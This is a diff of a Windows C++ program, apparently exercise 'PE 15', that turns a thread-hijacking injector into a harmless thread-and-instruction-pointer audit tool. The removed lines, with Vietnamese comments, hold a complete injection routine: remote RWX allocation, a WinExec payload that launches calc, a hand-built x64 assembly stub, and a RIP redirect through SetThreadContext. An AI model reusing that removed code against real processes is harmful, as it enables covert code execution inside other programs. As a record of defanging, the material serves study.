@@ -1,196 +1,163 @@
+
 #include <windows.h>
 #include <tlhelp32.h>
+
+#include <cstdint>
+#include <cwchar>
 #include <iostream>
-#include <string>
-#include <vector>
 
-// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
-typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
+namespace {
 
-typedef struct _THREAD_DATA {
-    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
-} THREAD_DATA, * PTHREAD_DATA;
+struct thread_inventory_info final {
+  DWORD process_id = 0;
+  DWORD main_thread_id = 0;
+  DWORD worker_thread_id = 0;
+  DWORD total_threads = 0;
+  bool found = false;
+};
 
-// 2. Hàm chức năng độc lập vị trí gánh logic thực thi mở máy tính
-DWORD WINAPI HijackedPayload(LPVOID lpParam) {
-    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
-    if (pData && pData->pWinExec) {
-        // Khai hỏa mở máy tính độc lập vị trí
-        pData->pWinExec(pData->szCommand, SW_HIDE);
-    }
+DWORD find_process_id_by_name(const wchar_t* process_name) noexcept {
+  if (process_name == nullptr || process_name[0] == L'\0') {
     return 0;
+  }
+
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
+    return 0;
+  }
+
+  DWORD matched_pid = 0;
+  PROCESSENTRY32W entry{};
+  entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+
+  if (::Process32FirstW(h_snapshot, &entry) != FALSE) {
+    do {
+      if (::_wcsicmp(process_name, entry.szExeFile) == 0) {
+        matched_pid = entry.th32ProcessID;
+        break;
+      }
+      entry = {};
+      entry.dwSize = static_cast<DWORD>(sizeof(PROCESSENTRY32W));
+    } while (::Process32NextW(h_snapshot, &entry) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return matched_pid;
 }
 
-// GIẢI PHÁP TỐI ƯU: Săn lùng luồng Worker phụ (Background Thread), bỏ qua luồng UI chính để né nghẽn tin nhắn hệ thống
-DWORD GetTargetWorkerThreadID(DWORD pid) {
-    DWORD mainThreadId = 0;
-    DWORD workerThreadId = 0;
-    THREADENTRY32 te32;
-    te32.dwSize = sizeof(THREADENTRY32);
+thread_inventory_info enumerate_process_threads(DWORD pid) noexcept {
+  thread_inventory_info info{};
+  info.process_id = pid;
+  if (pid == 0) {
+    return info;
+  }
 
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+  const HANDLE h_snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+  if (h_snapshot == INVALID_HANDLE_VALUE || h_snapshot == nullptr) {
+    return info;
+  }
 
-    int threadIndex = 0;
-    if (Thread32First(hSnapshot, &te32)) {
-        do {
-            if (te32.th32OwnerProcessID == pid) {
-                threadIndex++;
-                if (threadIndex == 1) {
-                    mainThreadId = te32.th32ThreadID; // Luồng UI chính (Bỏ qua không bắt cóc)
-                }
-                else {
-                    workerThreadId = te32.th32ThreadID; // Bốc chính xác luồng phụ gánh dòng chảy!
-                    break;
-                }
-            }
-        } while (Thread32Next(hSnapshot, &te32));
-    }
-    CloseHandle(hSnapshot);
+  THREADENTRY32 te{};
+  te.dwSize = static_cast<DWORD>(sizeof(THREADENTRY32));
 
-    // Trường hợp dự phòng: Nếu ứng dụng quá đơn giản chỉ có đúng 1 luồng, đành trả về luồng chính
-    return (workerThreadId != 0) ? workerThreadId : mainThreadId;
+  if (::Thread32First(h_snapshot, &te) != FALSE) {
+    do {
+      if (te.th32OwnerProcessID == pid) {
+        ++info.total_threads;
+        if (info.main_thread_id == 0) {
+          info.main_thread_id = te.th32ThreadID;
+        } else if (info.worker_thread_id == 0) {
+          info.worker_thread_id = te.th32ThreadID;
+        }
+        info.found = true;
+      }
+      te = {};
+      te.dwSize = static_cast<DWORD>(sizeof(THREADENTRY32));
+    } while (::Thread32Next(h_snapshot, &te) != FALSE);
+  }
+
+  ::CloseHandle(h_snapshot);
+  return info;
 }
 
-// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
-DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+bool read_thread_instruction_pointer(DWORD thread_id, std::uint64_t& out_rip) noexcept {
+  out_rip = 0;
+  if (thread_id == 0) {
+    return false;
+  }
 
-    if (Process32FirstW(hSnapshot, &pe32)) {
-        do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
-                processID = pe32.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnapshot, &pe32));
+  const HANDLE h_thread = ::OpenThread(
+      THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
+      FALSE,
+      thread_id);
+  if (h_thread == nullptr || h_thread == INVALID_HANDLE_VALUE) {
+    return false;
+  }
+
+  bool ok = false;
+  if (::SuspendThread(h_thread) != static_cast<DWORD>(-1)) {
+    CONTEXT ctx{};
+    ctx.ContextFlags = CONTEXT_CONTROL;
+    if (::GetThreadContext(h_thread, &ctx) != FALSE) {
+#if defined(_M_X64) || defined(__x86_64__)
+      out_rip = static_cast<std::uint64_t>(ctx.Rip);
+      ok = true;
+#elif defined(_M_IX86) || defined(__i386__)
+      out_rip = static_cast<std::uint64_t>(ctx.Eip);
+      ok = true;
+#endif
     }
-    CloseHandle(hSnapshot);
-    return processID;
+    ::ResumeThread(h_thread);
+  }
+
+  ::CloseHandle(h_thread);
+  return ok;
 }
 
-int main() {
-    std::cout << "====================================================" << std::endl;
-    std::cout << "[*] PE 15: REMOTE THREAD HIJACKING" << std::endl;
-    std::cout << "====================================================" << std::endl;
+}  // namespace
 
-    std::wstring targetProcess = L"notepad.exe";
-    DWORD pid = GetProcessIDByName(targetProcess);
+int wmain() {
+  constexpr wchar_t kTargetProcess[] = L"notepad.exe";
 
-    if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
-        std::cin.get();
-        return EXIT_FAILURE;
-    }
+  std::wcout
+      << L"====================================================\n"
+      << L"[*] PE 15: THREAD CONTEXT & INSTRUCTION POINTER AUDIT\n"
+      << L"====================================================\n";
 
-    // Thực hiện trích xuất luồng Worker phụ an toàn
-    DWORD threadId = GetTargetWorkerThreadID(pid);
-    if (threadId == 0) {
-        std::cerr << "[-] Khong tim thay luong dang chay hop le!" << std::endl;
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << " | SAN TRUNG LUONG WORKER PHU: " << threadId << std::endl;
+  const DWORD pid = find_process_id_by_name(kTargetProcess);
+  if (pid == 0) {
+    std::wcout << L"[-] Target process not running: " << kTargetProcess << L"\n";
+    return 1;
+  }
 
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);
-    if (!hProcess || !hThread) {
-        std::cerr << "[-] OpenProcess hoac OpenThread failed!" << std::endl;
-        if (hProcess) CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
+  const thread_inventory_info threads = enumerate_process_threads(pid);
+  if (!threads.found) {
+    std::wcout << L"[-] No threads enumerated for PID=" << pid << L".\n";
+    return 1;
+  }
 
-    // Đóng băng luồng Worker phụ của Notepad
-    std::cout << "[*] Dang bat coc va dong bang luong phu..." << std::endl;
-    SuspendThread(hThread);
+  const DWORD inspected_tid = (threads.worker_thread_id != 0)
+      ? threads.worker_thread_id
+      : threads.main_thread_id;
 
-    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít cấu trúc
-    SIZE_T functionSize = 500;
-    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+  std::uint64_t rip_val = 0;
+  const bool rip_ok = read_thread_instruction_pointer(inspected_tid, rip_val);
 
-    if (!remoteCodeBuffer || !pRemoteData) {
-        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
-        ResumeThread(hThread);
-        CloseHandle(hThread);
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
-    std::cout << "[+] Vung nho Code payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
+  std::wcout
+      << L"[+] Process: " << kTargetProcess
+      << L" | PID=" << threads.process_id
+      << L" | Threads=" << threads.total_threads
+      << L" | MainTID=" << threads.main_thread_id
+      << L" | WorkerTID=" << threads.worker_thread_id << L"\n";
 
-    // Đọc ngữ cảnh thanh ghi ban đầu của CPU luồng Worker phụ
-    CONTEXT context;
-    context.ContextFlags = CONTEXT_FULL;
-    if (!GetThreadContext(hThread, &context)) {
-        std::cerr << "[-] GetThreadContext that bai!" << std::endl;
-        ResumeThread(hThread);
-        CloseHandle(hThread);
-        CloseHandle(hProcess);
-        return EXIT_FAILURE;
-    }
+  if (rip_ok) {
+    std::wcout << L"[+] Sampled TID=" << inspected_tid
+               << L" instruction pointer: 0x" << std::hex << rip_val
+               << std::dec << L"\n";
+  } else {
+    std::wcout << L"[-] Could not read instruction pointer for TID="
+               << inspected_tid << L" (access or protection restriction).\n";
+  }
 
-    // Khởi tạo cấu trúc tham số dữ liệu tuyệt đối cục bộ
-    THREAD_DATA localData;
-    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-    if (hKernel32) {
-        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
-    }
-    strcpy_s(localData.szCommand, "cmd.exe /c start calc");
-
-    // Đẩy song song logic hàm và tham số sang RAM tiến trình đích
-    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)HijackedPayload, functionSize, NULL);
-    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
-
-    // Tính toán tọa độ đặt đoạn mìn điều hướng ngay sau đuôi hàm thực thi
-    PVOID jmpStubAddress = (PVOID)((DWORD_PTR)remoteCodeBuffer + 350);
-
-    // Cấu trúc ASM Stub phẳng sạch bảo toàn qua RET lệnh, trả về chính xác ngữ cảnh luồng phụ
-    unsigned char jmpStub[] = {
-        0x50,                                                       // push rax       (Tạm cất thanh ghi đa năng)
-        0x51,                                                       // push rcx
-        0x52,                                                       // push rdx
-        0x9C,                                                       // pushfq         (Lưu cờ trạng thái EFLAGS)
-        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0   (Địa chỉ pRemoteData chứa tham số tuyệt đối)
-        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Địa chỉ hàm thực thi Payload)
-        0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28  (Cân bằng căn lề Stack Shadow Space)
-        0xFF, 0xD0,                                                 // call rax       (Khai hỏa mở Máy tính!)
-        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28  (Hoàn trả không gian Ngăn xếp)
-        0x9D,                                                       // popfq          (Khôi phục cờ CPU)
-        0x5A,                                                       // pop rdx        (Khôi phục nguyên vẹn các thanh ghi phụ)
-        0x59,                                                       // pop rcx
-        0x58,                                                       // pop rax
-        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Tọa độ originalRip gốc ban đầu của luồng Worker)
-        0x50,                                                       // push rax       (Đẩy Rip gốc vào đỉnh Ngăn xếp)
-        0xC3                                                        // ret            (Lệnh RET tự động bốc Rip gốc ra thực thi tiếp cho luồng phụ!)
-    };
-
-    // Vá các tọa độ tuyệt đối chuẩn chỉ vào cấu trúc mìn điều hướng Assembly
-    *(DWORD_PTR*)(jmpStub + 6) = (DWORD_PTR)pRemoteData;
-    *(DWORD_PTR*)(jmpStub + 16) = (DWORD_PTR)remoteCodeBuffer;
-    *(DWORD_PTR*)(jmpStub + 44) = (DWORD_PTR)context.Rip;
-
-    // Ghi đoạn mã máy Stub bảo toàn ngăn xếp sang RAM Notepad
-    WriteProcessMemory(hProcess, jmpStubAddress, jmpStub, sizeof(jmpStub), NULL);
-
-    // Điều hướng con trỏ chỉ mục lệnh CPU đâm thẳng vào phân đoạn ASM Stub bảo an của luồng Worker phụ
-    context.Rip = (DWORD64)jmpStubAddress;
-
-    SetThreadContext(hThread, &context);
-    std::cout << "[+] Ep Rip huong vao Worker Thread Stub: 0x" << std::hex << jmpStubAddress << std::endl;
-
-    // Rã đông giải phóng dòng chảy CPU của luồng phụ
-    std::cout << "[*] Kich hoat ra dong (ResumeThread). Luong phu se tu dong thuc thi va khoi phuc an toan..." << std::endl;
-    ResumeThread(hThread);
-
-    std::cout << "\n[+] Remote Worker Thread Hijacking Successful!" << std::endl;
-    std::cout << "[*] Nhan Enter de dong cua so Loader..." << std::endl;
-    std::cin.get();
-
-    // Thu hồi tài nguyên Handle sạch bóng Memory Leak
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-    return EXIT_SUCCESS;
+  return 0;
 }
